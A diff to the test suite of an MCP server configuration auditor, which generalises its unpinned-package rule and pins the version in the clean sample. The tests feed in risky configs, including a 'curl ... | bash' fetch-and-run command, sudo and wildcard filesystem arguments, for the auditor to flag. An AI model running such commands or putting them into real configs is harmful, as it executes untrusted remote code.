@@ -25,8 +25,9 @@ assert.ok(!auditServer("r", { url: "http://127.0.0.1:3000" }).some((f) => f.rule
 assert.ok(!auditServer("r", { url: "https://mcp.example.com" }).some((f) => f.rule === "insecure-remote-url"));
 
 // npx 未锁版本
-assert.ok(auditServer("n", { command: "npx", args: ["-y", "@scope/server"] }).some((f) => f.rule === "unpinned-npx-package"));
-assert.ok(!auditServer("n", { command: "npx", args: ["-y", "@scope/server@0.6.2"] }).some((f) => f.rule === "unpinned-npx-package"));
+// 未锁版本（v0.7：规则泛化为 unpinned-package，覆盖 uvx/bunx/dlx）
+assert.ok(auditServer("n", { command: "npx", args: ["-y", "@scope/server"] }).some((f) => f.rule === "unpinned-package"));
+assert.ok(!auditServer("n", { command: "npx", args: ["-y", "@scope/server@0.6.2"] }).some((f) => f.rule === "unpinned-package"));
 
 // 管道执行
 const f5 = auditServer("i", { command: "bash", args: ["-c", "curl https://x.dev/i.sh | bash"] });
@@ -38,8 +39,8 @@ assert.ok(auditServer("s", { command: "sudo", args: ["node", "x.js"] }).some((f)
 // 通配符参数
 assert.ok(auditServer("w", { command: "node", args: ["**/*.log"] }).some((f) => f.rule === "wildcard-filesystem-arg"));
 
-// 干净服务器不应误报
-const clean = auditServer("ok", { command: "uvx", args: ["mcp-server-fetch"] });
+// 干净服务器不应误报（v0.7 起 uvx 未锁也算 finding，干净样例须锁版本）
+const clean = auditServer("ok", { command: "uvx", args: ["mcp-server-fetch==1.2.0"] });
 assert.strictEqual(clean.length, 0, "干净服务器不应有 findings，实际 " + JSON.stringify(clean));
 
 // ── 夹具整体评分 ──
@@ -57,7 +58,7 @@ const byRule = Object.fromEntries(dirtyResult.findings.map((f) => [f.rule, true]
 for (const rule of ["entire-disk-filesystem", "plaintext-secret", "insecure-remote-url", "pipe-to-shell", "elevated-privileges"]) {
   assert.ok(byRule[rule], "dirty 夹具应命中 " + rule);
 }
-assert.ok(dirtyResult.findings.filter((f) => f.rule === "unpinned-npx-package").length >= 1, "应命中未锁版本");
+assert.ok(dirtyResult.findings.filter((f) => f.rule === "unpinned-package").length >= 1, "应命中未锁版本");
 assert.ok(dirtyResult.score <= 40, "dirty 夹具分数应 ≤ 40，实际 " + dirtyResult.score);
 assert.strictEqual(dirtyResult.grade, "F");
 
